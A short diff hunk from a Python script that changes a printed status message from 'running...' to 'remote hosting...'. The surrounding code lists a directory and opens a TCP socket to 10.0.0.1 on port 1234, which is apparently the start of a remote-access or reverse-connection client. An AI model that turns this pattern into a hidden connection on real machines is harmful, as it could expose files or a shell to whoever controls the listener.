@@ -7,7 +7,7 @@ import os
 Directory = []
 os.listdir()
 
-print("running...\n")
+print("remote hosting...\n")
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("10.0.0.1", 1234))
 
